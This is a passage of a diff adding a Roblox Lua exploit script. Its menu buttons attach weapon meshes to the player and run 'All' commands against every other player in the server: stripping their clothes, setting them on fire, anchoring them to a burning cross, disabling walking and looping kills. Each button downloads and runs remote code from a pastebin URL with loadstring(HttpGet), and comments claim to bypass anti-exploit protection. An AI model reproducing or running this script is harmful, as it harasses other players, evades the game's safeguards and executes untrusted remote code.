+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.72,0,0)*  CFrame.new(0,0.5, -0.5)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=116679805"
+			duck.TextureId = "http://www.roblox.com/asset/?id=116679995"
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Skeleton King's Sword", "", function()
+	
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.72,0,0)*  CFrame.new(0,2.5, -0.5)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=96026548"
+			duck.TextureId = "http://www.roblox.com/asset/?id=96026577"
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Fencing Foil", "", function()
+	
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(3.2, 0, 0)*  CFrame.new(0,1, 1.8)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=10908449"
+			duck.TextureId = "http://www.roblox.com/asset/?id=10908412"
+	
+			duck.Scale = Vector3.new(1.4, 1.4, 1.4)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Torch", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.72,0,0)*  CFrame.new(0,1.5, -0.5)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=31584522"
+			duck.TextureId = "http://www.roblox.com/asset/?id=31585584"
+			part:AddFire().Size = 2
+	
+			duck.Scale = Vector3.new(2, 2, 2)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Illumina", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-9.45,0,1.5)*  CFrame.new(1,0.1, 1.5)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=12221720"
+			duck.TextureId = "http://www.roblox.com/asset/?id=12221720"
+			part:AddSparkles()
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Red Ballon", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.8,0,0)*  CFrame.new(-0.05,0.7, -1)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=25498565"
+			duck.TextureId = "http://www.roblox.com/asset/?id=26725707"
+	
+			duck.Scale = Vector3.new(1.5, 1.5, 1.5)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Umbrella", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+			local plr = game.Players.LocalPlayer
+	
+			plr.Character.Humanoid.JumpPower = 100
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.8,0,0)*  CFrame.new(-0.05,1.5, -1)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=43996518"
+			duck.TextureId = "http://www.roblox.com/asset/?id=43996783"
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Golden Steampunk Gloves", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-6.3,5.3,-6.3)*  CFrame.new(-0.05,-1, 0.45)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=243183921"
+			duck.TextureId = "http://www.roblox.com/asset/?id=243183937"
+	
+			duck.Scale = Vector3.new(3, 3, 3)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+	
+		local Tab = Window:NewTab("Fun Scripts")
+		local Section3 = Tab:NewSection("Fun Scripts")
+		Section3:NewButton("Naked All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+					for i,fee in pairs(player.Character:GetChildren()) do
+						if fee:IsA("BasePart") then
+							F3X.Object(fee).BrickColor = BrickColor.new(225)
+						end
+	
+						local pchar = player.Character -- This bypasses all Anti exploits so do not worry .
+						pchar.Shirt:Remove()
+	
+	
+						pchar.Pants:Remove()
+	
+	
+						pchar["Shirt Graphic"].Graphic = ""
+	
+					end
+				end)
+			end
+	
+	
+		end)
+		Section3:NewButton("Fart All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+	
+	
+					local yes = F3X.Object(player.Character.Torso):AddSmoke()
+					yes.Size = 0.43
+					yes.Color = Color3.new(0,3,0)
+	
+	
+				end)
+			end
+	
+	
+		end)
+		Section3:NewButton("Remove Walking All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+	
+	
+					F3X.Object(player.Character.HumanoidRootPart):Destroy()
+					F3X.Object(player.Character.Humanoid).Sit = true
+				end)
+			end
+	
+	
+		end)
+		Section3:NewButton("Fire All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+					for i,fee in pairs(player.Character:GetChildren()) do
+						if fee:IsA("BasePart") then
+							F3X.Object(fee):AddFire().Size = 0.8
+						end
+					end
+					F3X.Object(player.Character["Head"]).BrickColor = BrickColor.new(154)
+					F3X.Object(player.Character["Torso"]).BrickColor = BrickColor.new(154)
+					F3X.Object(player.Character["Left Leg"]).BrickColor = BrickColor.new(154)
+					F3X.Object(player.Character["Right Leg"]).BrickColor = BrickColor.new(154)
+					F3X.Object(player.Character["Left Arm"]).BrickColor = BrickColor.new(154)
+					F3X.Object(player.Character["Right Arm"]).BrickColor = BrickColor.new(154)
+	
+					local pchar = player.Character -- This bypasses all Anti exploits so do not worry .
+					pchar.Shirt:Remove()
+	
+	
+					pchar.Pants:Remove()
+	
+	
+					pchar["Shirt Graphic"].Graphic = ""
+	
+	
+				end)
+			end
+	
+	
+		end)
+		Section3:NewButton("Fairy All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+					F3X.Object(player.Character["Head"]).BrickColor = BrickColor.new(221)
+					F3X.Object(player.Character["Torso"]).BrickColor = BrickColor.new(221)
+					F3X.Object(player.Character["Left Leg"]).BrickColor = BrickColor.new(221)
+					F3X.Object(player.Character["Right Leg"]).BrickColor = BrickColor.new(221)
+					F3X.Object(player.Character["Left Arm"]).BrickColor = BrickColor.new(221)
+					F3X.Object(player.Character["Right Arm"]).BrickColor = BrickColor.new(221)
+	
+					local pchar = player.Character -- This bypasses all Anti exploits so do not worry .
+					pchar.Shirt:Remove()
+	
+	
+					pchar.Pants:Remove()
+	
+	
+					pchar["Shirt Graphic"].Graphic = ""
+	
+					for i,fee in pairs(player.Character:GetChildren()) do
+						if fee:IsA("BasePart") then
+							F3X.Object(fee):AddSparkles().Size = 0.8
+							F3X.Object(fee):AddSparkles().Size = 0.8
+							F3X.Object(fee):AddSparkles().Size = 0.8
+							F3X.Object(fee):AddSparkles().Size = 0.8
+						end
+					end
+	
+	
+				end)
+			end
+	
+	
+		end)
+		Section3:NewButton("Tron All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+					for i,fee in pairs(player.Character:GetChildren()) do
+						if fee:IsA("BasePart") then
+							local lol = F3X.Object(fee):AddMesh()
+							lol.MeshId = "http://www.roblox.com/asset/?id=6099332968"
+							lol.TextureId = "http://www.roblox.com/asset/?id=6099332968"
+							lol.Scale = Vector3.new(0.1,0.34,0.1)
+							F3X.Object(player.Character["Head"]).Transparency = 1
+						end
+					end
+					local pchar = player.Character -- This bypasses all Anti exploits so do not worry .
+					pchar.Head.Face:Remove()
+	
+	
+	
+	
+				end)
+			end
+		end)
+		Section3:NewButton("Crusify All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+	
+					local part = F3X.new("Part", workspace)
+					part.CanCollide = false
+					part.BrickColor = BrickColor.new(217)
+					part.Material = ("Wood")
+					part:AddFire().Size = 8
+					part.Size = Vector3.new(0.8, 10, 1)
+					part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, 1)
+					wait()
+					part:WeldTo(player.Character.HumanoidRootPart)
+					local part = F3X.new("Part", workspace)
+					part.CanCollide = false
+					part.BrickColor = BrickColor.new(217)
+					part.Material = ("Wood")
+					part.Size = Vector3.new(0.8, 1, 5)
+					part:AddFire().Size = 8
+					part.CFrame = player.Character.HumanoidRootPart.CFrame *CFrame.Angles(0,4.76,0) * CFrame.new(1, 2, 0)
+					wait()
+					part:WeldTo(player.Character.HumanoidRootPart)
+					F3X.Object(player.Character.HumanoidRootPart).Anchored = true
+	
+				end)
+			end
+	
+		end)
+		Section2:NewButton("SoulStealer", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.75,0,0)*  CFrame.new(-0.05,2.85, -1.1)  wait()     
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=94840342"
+			duck.TextureId = "http://www.roblox.com/asset/?id=94840359"
+			part:AddFire().Size = 3
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Rainbow Periastron Omega", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-6.25,9.45,4.55)*  CFrame.new(0.85,0.2, 2.5)  wait()     
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=80557857"
+			duck.TextureId = "http://www.roblox.com/asset/?id=157345185"
+			part:AddSparkles()
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Telamon's Foe Hammer", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-6.25,9.45,-4.55)*  CFrame.new(-1.65,0.2,2.5)  wait()     
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=53420470"
+			duck.TextureId = "http://www.roblox.com/asset/?id=53420537"
+	
+	
+			duck.Scale = Vector3.new(1.7, 1.7, 1.7)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Big Ban Hammer", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-7.85,9.45,0)*  CFrame.new(0.15,1.7,0.8)  wait()     
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=10604848"
+			duck.TextureId = "http://www.roblox.com/asset/?id=10605252"
+	
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section3:NewButton("Loop Kill All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+					while wait(0.4) do
